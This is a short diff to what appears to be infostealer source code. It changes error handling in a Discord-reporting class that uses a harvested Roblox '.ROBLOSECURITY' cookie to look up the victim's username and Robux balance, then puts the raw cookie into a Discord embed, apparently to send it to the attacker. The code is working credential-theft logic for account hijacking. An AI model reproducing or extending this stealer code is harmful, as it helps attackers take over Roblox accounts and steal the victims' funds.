@@ -314,11 +314,8 @@ class Discord:
             else:
                 embed = Embed(title="Roblox Info", color=5639644)
                 headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
-                try:
-                    info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
-                    return info
-                except Exception:
-                    pass
+                info = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers).json()
+
                 embed.add_field(name="<:roblox_icon:1041819334969937931> Name:", value=f"`{info['UserName']}`", inline=True)
                 embed.add_field(name="<:robux_coin:1041813572407283842> Robux:", value=f"`{info['RobuxBalance']}`", inline=True)
                 embed.add_field(name="🍪 Cookie:", value=f"`{robo_cookie}`", inline=False)
